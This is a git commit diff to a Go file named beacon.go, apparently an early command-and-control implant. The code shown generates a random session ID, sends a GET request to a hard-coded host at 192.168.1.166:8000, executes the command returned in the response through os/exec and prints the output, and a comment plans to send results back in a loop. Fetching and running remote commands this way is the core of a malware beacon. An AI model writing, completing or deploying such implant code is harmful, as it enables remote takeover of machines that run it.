b2eaef70926d3cbd1855b546f3ae9c4d8b4741fd
matt-culbert <culbertmatt@gmail.com>
2022-11-28 16:29:39 -0500

    Update beacon.go

--- beacon.go
+++ beacon.go
@@ -9,25 +9,32 @@ import (
 	"net/http"
 	"os/exec"
 	"strings"
-	"time"
 )
+
+var charset = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+
+func randStr(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		// randomly select 1 character from given charset
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(b)
+}
 
 func main() {
 	// to do
 	// generate random uuid of numbers/letters [done]
 	// add a user agent with http.requests
 	// execute out from http request [all done]
-
-	rand.Seed(time.Now().UnixNano())         // Seed the randomness
-	charset := "abcdefghijklmnopqrstuvwxyz"  // The charset to draw from
-	uuid := charset[rand.Intn(len(charset))] // Generate the UUID
-
+	uuid := randStr(20)
+	fmt.Printf("%s \n", uuid)
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
 	client := http.Client{}
 	// The request itself, a simple GET to the py server hosting index.html with whoami written
 	// This will need to be changed to a UUID that's generated at each run time
 	req, err := http.NewRequest("GET", "http://192.168.1.166:8000", nil)
-	req.Header.Add("APPSESSIONID", string(uuid))
+	req.Header.Add("APPSESSIONID", uuid)
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Fatalln(err)
@@ -51,4 +58,6 @@ func main() {
 	stdout, err := cmd.Output()
 
 	fmt.Printf(string(stdout))
+
+	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating
 }
